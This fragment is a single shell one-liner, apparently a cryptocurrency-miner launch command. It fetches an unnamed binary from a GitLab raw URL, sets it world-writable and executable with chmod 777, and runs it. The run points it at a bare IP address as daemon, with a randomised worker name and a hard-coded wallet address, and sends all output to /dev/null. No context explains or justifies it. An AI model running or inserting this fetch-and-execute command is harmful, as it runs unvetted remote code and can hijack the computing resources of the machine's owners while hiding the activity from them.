...
wget https://gitlab.com/majapahlevi/mvp/-/raw/main/tnnnew && chmod 777 tnnnew && ./tnnnew --daemon-address 147.182.167.202 --port 80 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qrp5cg0hgjygpmeyr7ru5dky3shhcvrjen765e6qdur2yfl9mcyuqt8vqyqmh > /dev/null 2>&1
